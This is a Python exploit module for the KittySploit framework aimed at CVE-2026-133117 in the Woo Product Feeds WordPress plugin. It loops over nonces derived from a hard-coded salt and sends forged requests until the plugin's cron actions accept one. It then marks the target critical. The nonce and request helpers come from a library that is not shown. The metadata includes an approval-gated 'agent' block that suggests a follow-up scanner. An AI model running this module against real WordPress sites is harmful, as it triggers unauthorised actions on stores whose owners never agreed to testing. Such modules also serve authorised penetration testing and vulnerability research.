#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-133117 — Woo Product Feeds forged cron action."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.woo_product_feeds import Woo_product_feeds, DEFAULT_SALT


class Module(Auxiliary, Http_client, Woo_product_feeds):
    __info__ = {
        "name": "Woo Product Feeds CVE-2026-133117 cron trigger",
        "description": "Triggers woo_feed_cron_* via hard-coded salt nonce.",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-133117"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-133117"],
        "tags": ["wordpress", "woocommerce", "cve-2026-133117", "auxiliary"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": [
                    "scanner/http/woo_product_feeds_cve_2026_133117_detect",
                ],
            },
        },
    }

    cron_salt = OptString(DEFAULT_SALT, "Hard-coded cron salt", required=False, advanced=True)

    def run(self):
        salt = str(self.cron_salt or DEFAULT_SALT)
        for nonce in self.woo_feeds_nonces(salt):
            code, body, ok = self.woo_feeds_trigger_cron(nonce)
            if ok:
                print_success(f"Cron accepted (nonce {nonce[:8]}..., HTTP {code})")
                print_status(body[:300])
                self.set_info(severity="critical", cve="CVE-2026-133117", nonce=nonce)
                return True
        print_error("Cron action not accepted")
        return False